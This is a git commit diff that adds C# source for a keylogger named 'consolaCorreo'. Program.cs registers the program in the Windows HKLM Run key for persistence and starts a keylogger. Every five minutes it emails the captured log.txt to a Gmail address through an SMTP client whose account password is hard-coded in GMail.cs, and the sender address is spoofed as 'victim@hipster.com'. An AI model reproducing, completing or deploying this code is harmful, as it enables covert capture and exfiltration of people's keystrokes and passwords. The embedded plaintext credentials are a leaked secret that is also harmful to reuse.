04f0274610af507b2d9bf8fdd604fd975323af09
lquenta <lquenta@gmail.com>
2017-02-23 13:17:45 -0400

    consola

---
+++ consolaCorreo/GMAil.cs
@@ -0,0 +1,24 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Mail;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace consolaCorreo
+
+{
+    class GMail
+    {
+        SmtpClient server = new SmtpClient("smtp.gmail.com", 587);
+        public GMail()
+        {
+            server.Credentials = new System.Net.NetworkCredential("uyarikuna@gmail.com", "uyarikuna2015");
+            server.EnableSsl = true;
+        }
+        public void MandarCorreo(MailMessage mensaje)
+        {
+            server.Send(mensaje);
+        }
+    }
+}
---
+++ consolaCorreo/Program.cs
@@ -0,0 +1,67 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Mail;
+using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
+using System.Windows.Forms;
+
+namespace consolaCorreo
+{
+    
+    class Program
+    {
+
+
+        private static void function_test2()
+        {
+            Keylogger.Init();
+
+        }
+
+        private static void function_test()
+        {
+            while (true)
+            {
+                System.Threading.Thread.Sleep(300000);
+                GMail Cr = new GMail();
+                MailMessage mnsj = new MailMessage();
+                mnsj.Subject = "pruebaJorge";
+                mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
+                mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
+                Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\log.txt");
+                mnsj.Attachments.Add(attach);
+                mnsj.Body = String.Format("keylog, timestamp: \n\n {0}", new DateTime().ToUniversalTime());
+                Cr.MandarCorreo(mnsj);
+                // Force a garbage collection to occur for this demo.
+                GC.Collect();
+            }
+        }
+        static void Main()
+        {
+            string path = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(
+                path, true);
+            key.SetValue("MyApplication", Application.ExecutablePath.ToString());
+
+            Task task = new Task(
+               function_test); task.Start();
+            Task task2 = new Task(function_test2); task2.Start();
+            while (true) ;
+               
+            
+
+           
+           
+           
+            
+            //while (true) ;
+        }
+
+        
+
+            
+    }
+}
